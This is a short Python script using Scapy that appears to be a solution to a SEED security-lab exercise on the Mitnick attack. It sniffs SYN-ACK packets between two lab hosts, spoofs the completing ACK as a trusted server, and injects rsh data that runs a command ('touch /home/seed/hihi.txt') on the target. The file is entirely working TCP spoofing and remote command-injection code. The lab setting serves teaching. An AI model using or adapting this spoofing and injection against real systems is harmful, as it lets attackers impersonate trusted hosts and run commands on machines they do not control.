#!/usr/bin/python3
from scapy.all import *

srvip = "10.9.0.6"
srvport = 1023
xip = "10.9.0.5"
xport = 514
syn_seq = 0x1000

def spoof(pkt):
    old_tcp = pkt[TCP]
  
    if old_tcp.flags == 'SA':
        # spoof ACK to finish handshaking
        ip = IP(src = srvip, dst = xip)
        tcp = TCP(sport = srvport, dport = xport,
                    seq = syn_seq + 1,
                    ack = old_tcp.seq + 1,
                    flags = 'A')
        send(ip/tcp, verbose=0)
        print('{} --> {} Sent ACK'.format(ip.src, ip.dst))
      
        data = b'9090\x00seed\x00seed\x00touch /home/seed/hihi.txt\x00'
        tcp.flags = 'PA'
        send(ip/tcp/data, verbose=0)
        print('{} --> {} Sent rsh data'.format(ip.src, ip.dst))

myFilter = 'tcp[tcpflags] & tcp-ack != 0 and src host 10.9.0.5 and dst host 10.9.0.6'

sniff(iface='br-f8201c9c13ab', filter=myFilter, prn=spoof)
